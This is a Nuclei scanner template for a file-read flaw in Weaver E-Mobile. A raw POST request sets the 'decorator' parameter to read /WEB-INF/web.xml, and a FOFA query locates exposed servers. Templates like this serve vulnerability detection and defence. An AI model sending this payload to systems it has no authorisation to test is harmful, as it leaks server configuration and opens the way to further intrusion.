id: weaver-emobile-decorator-fileread

info:
  name: 泛微-移动管理平台-消息服务-confirm-文件读取
  author: leadlife
  severity: high
  description: 
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: app="泛微-EMobile" && icon_hash="1578525679"
  tags: weaver,fileread,oa,emobile

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip, deflate

        decorator=%2FWEB-INF%2Fweb.xml&confirm=true

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,"<?xml","session-config")
        condition: and